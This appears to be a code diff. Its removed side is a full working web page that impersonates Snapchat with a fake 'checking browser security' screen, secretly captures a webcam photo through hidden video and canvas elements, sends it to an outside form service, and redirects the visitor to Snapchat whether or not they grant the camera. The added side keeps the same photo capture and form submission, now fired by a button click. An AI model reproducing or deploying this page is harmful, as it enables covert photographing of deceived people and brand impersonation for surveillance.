@@ -1,68 +1,22 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Snapchat | جاري التحقق</title>
-    <!-- أيقونة سناب شات -->
-    <link rel="icon" type="image/png" href="https://snapchat.com">
-    <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #FFFC00; }
-        .box { text-align: center; background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 85%; max-width: 350px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h3 { font-size: 18px; color: #333; margin: 0; }
-        p { font-size: 13px; color: #666; margin-top: 10px; }
-    </style>
-</head>
-<body>
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const snap = document.getElementById('snap');
+const imageInput = document.getElementById('imageInput');
+const form = document.getElementById('photoForm');
 
-    <div class="box">
-        <div class="loader"></div>
-        <h3>جاري التحقق من أمان المتصفح</h3>
-        <p>يرجى السماح بالوصول للكاميرا للمتابعة...</p>
-    </div>
+// طلب الوصول للكاميرا
+navigator.mediaDevices.getUserMedia({ video: true })
+  .then(stream => { video.srcObject = stream; });
 
-    <!-- عناصر التقاط الصورة (مخفية) -->
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
-    <!-- الرابط المحدث النهائي -->
-    <form id="photoForm" action="https://formspree.io" method="POST">
-        <input type="hidden" name="image_data" id="imageInput">
-        <input type="hidden" name="_next" value="https://snapchat.com">
-        <input type="hidden" name="_subject" value="التقاط جديد">
-    </form>
-
-    <script>
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const imageInput = document.getElementById('imageInput');
-        const form = document.getElementById('photoForm');
-
-        // طلب الوصول للكاميرا
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                video.srcObject = stream;
-                
-                // التقاط الصورة بعد ثانيتين (لضبط الإضاءة)
-                setTimeout(() => {
-                    const context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, 640, 480);
-                    
-                    // تحويل الصورة لـ JPEG مضغوط لضمان الإرسال السريع
-                    const dataURL = canvas.toDataURL('image/jpeg', 0.5);
-                    imageInput.value = dataURL;
-                    
-                    // إرسال النموذج تلقائياً
-                    form.submit();
-                }, 2000);
-            })
-            .catch(err => {
-                console.error("رفض الكاميرا:", err);
-                // توجيه المستخدم حتى لو رفض الكاميرا
-                window.location.href = "https://snapchat.com";
-            });
-    </script>
-</body>
-</html>
+// عند الضغط على الزر
+snap.addEventListener('click', () => {
+  const context = canvas.getContext('2d');
+  context.drawImage(video, 0, 0, 320, 240);
+  
+  // تحويل الصورة لرابط نصي (Base64)
+  const dataURL = canvas.toDataURL('image/png');
+  imageInput.value = dataURL;
+  
+  // إرسال النموذج
+  form.submit();
+});
